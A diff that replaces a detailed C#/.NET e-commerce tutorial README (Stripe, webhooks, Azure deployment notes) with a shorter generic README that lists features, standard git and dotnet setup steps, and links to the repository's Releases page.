@@ -1,302 +1,120 @@
-# Building Ecommerce web application with C#
-![](https://komarev.com/ghpvc/?username=mscbuild) 
- ![](https://img.shields.io/github/license/mscbuild/e-learning) 
- ![](https://img.shields.io/github/repo-size/mscbuild/e-learning)
-![](https://img.shields.io/badge/PRs-Welcome-green)
-![](https://img.shields.io/badge/code%20style-asp.net-green)
-![](https://img.shields.io/github/stars/mscbuild)
-![](https://img.shields.io/badge/Topic-Github-lighred)
-![](https://img.shields.io/website?url=https%3A%2F%2Fgithub.com%2Fmscbuild)
+# E-Commerce App 🛒
 
-## 🔧 Core Functional Requirements.
+![GitHub release](https://img.shields.io/github/release/mooo17/-e-commerce-app.svg?style=flat-square)
 
-### 1. Product Management.
- 
-<li>Add, update, delete products.
+Welcome to the E-Commerce App repository! This project aims to build a fully functional e-commerce web application using modern technologies. You can download the latest release [here](https://github.com/mooo17/-e-commerce-app/releases) and follow the instructions to set it up.
 
-<li>Store product details: name, description, price, SKU, images, category, etc.
+## Table of Contents
 
-<li>Display products for customers. 
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-### 2. Inventory Management.
+## Features
 
-<li>Track inventory per product.
+- **User Authentication**: Secure login and registration for users.
+- **Product Management**: Add, edit, and delete products easily.
+- **Shopping Cart**: Users can add products to their cart and proceed to checkout.
+- **Payment Integration**: Seamless payment processing with popular gateways.
+- **Order History**: Users can view their past orders.
+- **Responsive Design**: Optimized for both desktop and mobile devices.
 
-<li>Add stock (e.g., when restocking).
+## Technologies Used
 
-<li>Subtract stock when orders are placed (and paid).
+This project utilizes a range of technologies to deliver a smooth user experience:
 
-<li>Optional: Alert for low inventory levels.
+- **.NET Framework**: The backbone of the application, providing a robust structure.
+- **Razor Pages**: Simplifies the creation of dynamic web pages.
+- **PostgreSQL**: A powerful database system for data storage.
+- **HTML/CSS/JavaScript**: For building the user interface.
+- **Bootstrap**: Ensures responsive design and user-friendly navigation.
+- **Payment APIs**: Integration with payment gateways for processing transactions.
 
-### 3. Customer Management.
+## Installation
 
-<li>Register and authenticate customers.
+To get started with the E-Commerce App, follow these steps:
 
-<li>Store profile: name, email, phone, shipping address, etc.
+1. **Clone the repository**:
 
-<li>Allow customers to update their info.
+   ```bash
+   git clone https://github.com/mooo17/-e-commerce-app.git
+   cd -e-commerce-app
+   ```
 
-### 4. Order Management
+2. **Install dependencies**:
 
-<li>Store order details: products, quantities, price, customer info, shipping status.
+   Use the package manager of your choice to install the necessary packages. For example, if you're using .NET, you can run:
 
-<li>Allow order history viewing for users.
+   ```bash
+   dotnet restore
+   ```
 
-<li>Admins can manage or update order statuses (e.g., Processing, Shipped, Delivered).
+3. **Set up the database**:
 
-### 5. Shopping Cart & Checkout
+   Make sure PostgreSQL is installed and running. Create a database for the application and update the connection string in the `appsettings.json` file.
 
-<li>Add/remove items to/from cart.
+4. **Run the application**:
 
-<li>Show total cost, taxes, and shipping.
+   Use the following command to start the application:
 
-<li>Checkout page with payment and shipping details.
+   ```bash
+   dotnet run
+   ```
 
-### 6. Payment Processing
+5. **Access the application**:
 
-<li>Integrate a payment gateway (e.g., Stripe, PayPal, Square).
+   Open your browser and go to `http://localhost:5000` to see the application in action.
 
-<li>Securely handle payment details (PCI compliance).
+For the latest release, download it [here](https://github.com/mooo17/-e-commerce-app/releases) and follow the instructions provided.
 
-<li>Confirm successful/failed transactions and update order status accordingly.
+## Usage
 
-## 📂 Optional (but valuable) Features
+Once the application is running, you can:
 
-<li>User authentication with JWT/cookies.
+- **Register a new account**: Click on the "Sign Up" button to create a new user account.
+- **Browse products**: View available products on the home page.
+- **Add to cart**: Click on the "Add to Cart" button for any product you wish to purchase.
+- **Checkout**: Go to your cart and follow the prompts to complete your purchase.
 
-<li>Product search and filtering (by category, price, etc.).
+## Contributing
 
-<li>Promo codes or discount system.
+We welcome contributions from the community! If you would like to contribute, please follow these steps:
 
-<li>Email confirmation and notifications.
+1. **Fork the repository**: Click on the "Fork" button at the top right corner of the page.
+2. **Create a new branch**: 
 
-<li>Admin panel for managing products, customers, and orders.
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
 
-<li>Reviews/ratings system.
+3. **Make your changes**: Implement your feature or fix the bug.
+4. **Commit your changes**:
 
-## 🧱 Technology Stack Suggestion (C#/.NET Core)
+   ```bash
+   git commit -m "Add some feature"
+   ```
 
-<li>Backend: ASP.NET Core Web API
+5. **Push to the branch**:
 
-<li>Frontend: Razor Pages, Blazor, or a JS framework (React, Angular) with API
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
 
-<li>Database: SQL Server or PostgreSQL via Entity Framework Core
+6. **Create a Pull Request**: Go to the original repository and submit your pull request.
 
-<li>Authentication: ASP.NET Identity or JWT
+## License
 
-<li>Payments: Stripe API (easiest to integrate/test)
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## 🗂️ Project Structure
+## Contact
 
-Assuming you're building an ASP.NET Core Web API backend, your folder structure might look like this:
-```ruby
+For any questions or feedback, please feel free to reach out:
 
-EcommerceApp/
-│
-├── Controllers/           → API endpoints (ProductsController, OrdersController, etc.)
-├── Models/                → Data models (Product, Customer, Order, etc.)
-├── Data/                  → DbContext and seed data
-├── DTOs/                  → Data Transfer Objects for requests/responses
-├── Services/              → Business logic (e.g., OrderService, PaymentService)
-├── Repositories/          → Data access layer (optional abstraction)
-├── Migrations/            → EF Core migrations
-├── wwwroot/               → Static files (if applicable)
-├── Program.cs             → App entry point
-└── appsettings.json       → Configuration (connection strings, etc.)
-```
-### 🧩 1. Database Schema
-### 📦 2. Order
-### 📄 3. OrderItem
-### 👤 4. Customer
-### 💳 5. Payment (Optional if using external gateway only)
-### 🔗 6. AppDbContext.cs
-### 🧾 7. ProductsController.cs
-
-# 🧪 Example Test with curl or Postman.
-
-### GET all products
-```ruby
-GET http://localhost:5000/api/products
-```
-### POST new product
-
-```ruby
-POST http://localhost:5000/api/products
-Content-Type: application/json
+- **Author**: [Your Name](https://github.com/yourusername)
+- **Email**: your.email@example.com
 
-{
-    "name": "Laptop",
-    "description": "High-performance laptop",
-    "price": 1200.00,
-    "stock": 15,
-    "sku": "LAP123",
-    "imageUrl": "https://example.com/laptop.jpg"
-}
-```
-### 🧩 8. OrderService.cs
-
-# ✅ How to Use OrderService
-
-Example us
-
-```ruby
-[HttpPost("create")]
-public async Task<IActionResult> CreateOrder(CreateOrderRequest request)
-{
-    var result = await _orderService.CreateOrderAsync(request.CustomerId, request.Items);
-
-    if (!result.Success)
-        return BadRequest(result.Message);
-
-    return Ok(result.Message);
-}
-```
-### DTO
-
-```ruby
-public class CreateOrderRequest
-{
-    public int CustomerId { get; set; }
-    public List<OrderItemRequest> Items { get; set; }
-}
-
-public class OrderItemRequest
-{
-    public int ProductId { get; set; }
-    public int Quantity { get; set; }
-}
-```
-# 💳 Step-by-Step: Stripe Integration for
-
-### ✅ 1. Set Up Stripe in Your
-
-Install the Stripe
-
-```ruby
-dotnet add package Stripe.net
-```
-
-In `appsettings.json`, add you
-```ruby
-"Stripe": {
-  "SecretKey": "sk_test_YourSecretKey",
-  "PublishableKey": "pk_test_YourPublicKey"
-}
-```
-### Load Stripe configuration in Program.cs or Startup.cs:
-
-```ruby
-StripeConfiguration.ApiKey = builder.Configuration["Stripe:SecretKey"];
-```
-### 🧾 2. Create a PaymentService
-
-This will handle creating a Stripe charge (or PaymentIntent for newer APIs):
-  
-### 🎯 3. Payment Controller Endpoint
-
-### 🧪 4. Testing
-
-You can now POST to /api/payments/create-checkout-session/{orderId} and redirect the user to the returned url
-
-# 📡 Stripe Webhook Integration (Payment Confirmation)
-
-### ✅ 1. Why Use Webhooks?
-
-Stripe Checkout redirects users after payment, but the most secure way to confirm payment is by listening to Stripe’s server-side webhooks.
-
-### 🛠️ 2. Add Webhook Endpoint to Your App
-
->📌 Note: When creating the Checkout Session earlier, you can add Metadata = new Dictionary<string, string> { { "order_id", order.Id.ToString() } } to the SessionCreateOptions.
-Stripe Checkout redirects users after payment, but the most secure way to confirm payment is by listening to Stripe’s server-side webhooks.
-
-### 🧪 3. Expose Localhost for Stripe Testing
-
-# ✅ Result
-
-1.Now your app will:
-
-2.Create Stripe Checkout sessions.
-
-3.Send users to Stripe to pay.
-
-4.Listen for successful payments via webhook.
-
-5.Automatically mark the order as “Paid” in your database.
-
-# 🖼️  Basic UI Components
-
-### 📄 Pages/Products.razor
-
-### 🛒 Services/CartService.cs
-
-# 💳 Checkout Page
-
-### 📄 Pages/Checkout.razor
-
-### 🧪 Test Flow
-
-1.Run your backend API and Blazor app
-
-2.Visit /products
-
-3.Add items to cart
-
-4. /checkout
-
-5.Click "Proceed to Payment" → redirects to Stripe
-
-6.After successful payment, Stripe webhook marks order as "Paid"
-
-# 🚀 Azure Deployment:
-
-✅ Backend (ASP.NET Core Web API)
-
-✅ Frontend
-
-✅ SQL Databas
-
-✅ Stripe Webhooks (via Stripe CLI or Azure F)
-
-# 🚀 GitHub Ac
-
-🧭 Y
-
-✅ Automatic build and test on each push
-
-✅ Publish to Azure App Servi (API and Blazor)
-
-### 🔧 Step 1: Prep Your Azure App Services
-
-### 🔑 Step 2: Create Azure Deployment Credentials
-
-### 📁 Step 3: Create GitHub Workflow Files
-
-### 🔐 Step 4: Add Secrets to GitHub
-
-### 🧪 Step 5: Test CI/CD
-
-# ✅ Result
-
-Every time you push changes:
-
-<li>API and frontend are built
-
-<li>Deployed automatically to Azure App Services
-
-<li>No manual steps needed
-
-### Perfect — you're now fully set up with:
-
-✅ A C# e-commerce backend (API)
-
-✅ A Blazor Server frontend
-
-✅ Stripe payment + webhook handling
-
-✅ Azure SQL integration
-
-✅ Fully automated CI/CD via GitHub Actions
-
-This stack is solid for portfolio use, production trials, or job interviews.
-
-
+Thank you for checking out the E-Commerce App! Your support and contributions are greatly appreciated. For updates, please visit the [Releases](https://github.com/mooo17/-e-commerce-app/releases) section.
